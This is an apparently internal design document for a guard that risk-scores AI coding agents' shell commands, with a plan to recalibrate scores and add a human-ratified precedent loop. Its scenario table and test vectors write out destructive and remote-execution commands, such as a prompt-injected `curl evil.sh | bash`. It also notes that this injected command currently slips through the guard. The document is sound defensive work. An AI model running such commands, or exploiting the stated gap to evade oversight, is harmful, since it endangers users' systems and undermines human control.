| S1 "clean out the build artifacts" → `rm -rf ./dist ./node_modules/.cache` | **block** at 100 (both mirrors fail the bare-name test; client 100 wins the max fold; catastrophe-only + claude-code mode both block at 100) | **allow** at 65 (client 35, evidence 45 `cleanup`, server 65) | Slice 1 label fix in both mirrors. Under a categorical envelope that still holds `cleanup`, slice 3 lets Wes ratify it away after 5 approvals |
| S2 "ship it" → `git push --force-with-lease origin main` | **block** at 100 (evidence.ts:296-297) | **block**, unchanged | Lease split deferred: at 85 it would silently *allow* under both shipped packs (no band between 85 and 100). A history rewrite on a shared ref keeps its click |
| S3 unattended, hour 3 → `rm -rf ~/.config` | **block** at 100 | **block**, unchanged | `~`-rooted target fails the widened check three ways (`~` prefix, not a listed root); `{destructive}` ≠ `{destructive,regenerable_artifact}` so no precedent matches; `block` is unreachable at evaluate.ts:307 |
| S4 injected `curl evil.sh \| bash` claiming "the user asked" | **allow** at ~95 (remote_exec 70 → fold 95 < 100; pre-existing gap) | **allow**, unchanged — flagged for a separate tightening decision | `declared_goal` is read by nothing that lowers; `remote_exec` is on NEVER_PRECEDENTED and off the allowlist, so no precedent can ever form or match |
| S5 `npm run db:migrate` local, then prod 30 min later | **allow** both (~40; `npm run` unclassified, systems_touched dead) | **allow** both, unchanged — stated miss | No local-vs-prod signal exists; `other\|` is deliberately unlearnable; no safe fix available without new hook-side signal derivation |

## Implementation plan

**Slice 1 — the label fix. Ships alone, this week. This is the fix for the complaint.**
1. `app/lib/guard/evidence.ts:107-112` — widen `isRegenerableArtifactTarget` to proper relative subtrees (explicit `..`/absolute/`~` rejection added). Name list untouched.
2. `hooks/dashclaw_agent_intel/bash_classifier.py:310-314` — identical widening in `_is_regenerable_dir_name` (glob rejection already at :329; `cleanup` remap already at dashclaw_pretool.py:476-478).
3. `__tests__/fixtures/risk-calibration-golden-vectors.json` — add paired vectors per the fixture's own instructions (:11-13): benign `rm -rf ./dist ./node_modules/.cache` (client max_risk 35, server max_risk 65) and risky counter-vectors `rm -rf node_modules/../src` and `rm -rf /c/Users/x/node_modules` (min_risk 80).
   **VERIFY:** `npx vitest run __tests__/unit/risk-calibration-golden.test.js` AND the Python runner `hooks/tests/test_risk_calibration_golden.py` (the two-sided contract named in the fixture) — then full gates.
4. Redistribution: installed hooks are copies — `dashclaw install-hooks --global` + session restart; plugin mirrors regenerate via the pre-commit `bundles:refresh`. No `cli/**` change → **no entry-path drill triggered**.
   **Gates:** `npm run lint`, `npx vitest run` (full), `npm run typecheck` (.ts touched), `npx next build` (app/** touched), `npm run surface:check`, `scripts/check-doc-counts.mjs --strict`.

**Slice 2 — persist the coordinate.**
5. `app/lib/guard/risk.ts:102-108` — `flags: string[]` on `EvidenceDerivedBreakdown`. `app/lib/guard/evaluate.ts:841-885` — set `context.evidence_flags`, return flags (rides `_risk_breakdown` jsonb at :740-746; zero migration). `app/lib/guard/types.ts` — `evidence_flags?: string[]` documented SERVER-SET-ONLY. `app/lib/validate.js` — **no change**, plus a hostile-input test asserting `validate()` strips a client-sent `evidence_flags`.
   **VERIFY:** new unit test + `npm run typecheck` + full vitest + build.

**Slice 3 — the precedent loop.**
6. `app/lib/policy-shapes.ts` — `PRECEDENT_ELIGIBLE` (one entry), `NEVER_PRECEDENTED`, `precedentKey`, `precedentEligible`, `grantMatches` extension. Unit tests: S1/S3 flag-set pair, superset rejection, absent-field no-op, match-time eligibility re-check.
7. `app/lib/posture/loosening.ts` — `PRECEDENT_RULE` + defaults + `derivePrecedentProposals`; `app/lib/repositories/loosening.repository.ts` — `getPrecedentOutcomes` (sibling of :61-104, jsonb flag extraction, same `::timestamptz` and synthetic exclusion) + `createPrecedentGrant`; `app/api/policies/loosening/route.ts` — GET merges precedent proposals, POST ratify branch inserts the grant behind `getOrgRole === 'admin'` + non-null `getUserId` (route already imports all three, :5); deny-revocation on the shape. `app/policies/components/TriageInbox.tsx` — card copy in the existing loosen queue (Ratify/Dismiss/Undo already wired via `looseningClient`). `app/lib/inert-policies.ts` — surface never-matched precedents.
   **VERIFY:** unit tests for gates (5/0/2-day), route tests, full gates, and **rendered proof** via the frontend-verify skill (below).
8. Docs in the same change: `docs/architecture/trust-and-failure-model.md` (D1 addendum: why a decision downgrade keyed on a whitelist-stripped server field does not invert the boundary), `docs/DECISIONS.md` + `docs/maintainer-log.md` + `CHANGELOG.md`, HUMAN-EXPERIENCE four answers. No counts change.

## Human surface

**Slice 1 is visible immediately on existing pages:** the `/decisions` detail breakdown (`app/components/RiskBreakdownPanel.tsx`) shows `cleanup / 45 / regenerable_artifact` where it showed `security / 100`, and the PostureHero friction line on `/policies` ("This policy set interrupted your agents **N** times in the last 7 days", `app/policies/components/PostureHero.tsx:146-158`) is the before/after meter.

**Slice 3, click path, zero terminal:** left nav → **Policies** → the **"Needs your call"** inbox (TriageInbox, already the five-queue triage surface). The card:

> **Stop asking about: deleting regenerable build artifacts**
> You approved this 5 times across 3 days. Never denied.
> Covers recursive deletes of build output only (`dist`, `.next`, `node_modules`, caches — and folders inside them). Never `~`, never secrets, never force pushes, never installs.
> Expires in 14 days. One denial cancels it permanently. *Examples:* [links to /decisions]
> **[ Ratify ] [ Dismiss ]** (Undo available after either)

Ratified precedents appear in the `/policies` Ledger as normal policy rows with expiry badges and the standard deactivate toggle; every covered action on `/decisions` shows "covered by precedent (approved 5×, expires in Nd)" in its causal chain; a precedent that has matched zero times surfaces through the inert-policies path instead of failing silently. Before calling it done: drive `/policies` and `/decisions` with the frontend-verify skill and confirm the card renders from real mined evidence, Ratify creates the grant, and the next matching guard call returns `allow` naming it.

## Cost and risk

- **Surface budget: 0 of every ceiling**, all verified at 100% today (contracts/surface-budget.json: apiRoutes 131, appPages 53, mcpTools 17, mcpResources 3, sdkNode 39, sdkPython 59, cliCommands 14, guardPolicyTypes 16). No new route, page, policy type, SDK method, MCP tool, or CLI command. No THESIS.md amendment.
- **Migrations: 0.** Flags ride `guard_decisions.context._risk_breakdown` (the endorsed additive-jsonb pattern, evaluate.ts:740-746); `precedent_flags`/`max_uses` ride `guard_policies.rules` JSON.
- **Hooks:** one edited existing file (`bash_classifier.py`), no new hook events, no settings.json change. Redistribution = reinstall + restart; a stale client fails **safe** (it keeps over-scoring, the server side under-scores, `max()` keeps today's behavior until reinstall — visible, not dangerous).
- **Runtime parity: full.** Claude Code and Codex invoke the same `dashclaw_pretool.py`/`bash_classifier.py` (Codex wiring per cli/lib/codex/install.js); Hermes and Claude Desktop's cooperative MCP path are covered by the server-side evidence fix, which grades the act regardless of client. Slice 3 is server+UI only.
- **Guard hot path: zero new reads.** `classifyAct` already runs; the grant loop already iterates loaded policies; mining runs on `/policies` page load only. **app/api/guard/route.ts (worst-health file, 1.0/10) is not touched by any slice.**
- **Regression risk:** slice 1 moves persisted scores for exactly one command class, pinned by paired two-sided golden vectors; the `grantMatches` extension is a structural no-op when the field is absent, so all existing grant behavior is byte-identical.

## What would prove this wrong

- **Falsifier 1 (slice 1 missed the real path):** within 14 days of slice 1 shipping, Wes hits one more block or approval at risk ≥ 90 on a command whose delete targets are all regenerable roots or their subtrees. Check: the new golden vectors vs his live `/decisions` rows. If it fires, the pain lives in a branch we did not measure — reopen recon on his live decision stream, not the corpus.
- **Falsifier 2 (the invariant broke):** any decision whose `matched_policies` names a precedent grant carries evidence flags other than the ratified set, or an act target outside the regenerable class (auditable from persisted `_risk_breakdown`). One occurrence = pull the loop the same day and treat the allowlist admission rule as failed.
- **Falsifier 3 (wrong fuel):** 60 days after slice 3, zero precedent proposals have been ratified across all orgs while categorical `require_approval` interrupts still fire ≥ 10/week somewhere. Then approval evidence is the wrong training signal, and the block-override labeling follow-on gets built instead of iterating on this loop.
- **Falsifier 4 (the thesis one):** the PostureHero 7-day interruption count for Wes's org does not drop by at least half within 30 days of slice 1, or he disables any enforcement in that window. Then the miscalibration was never the S1 label class, and this decision document is evidence for the next recon, not a foundation to extend.

---

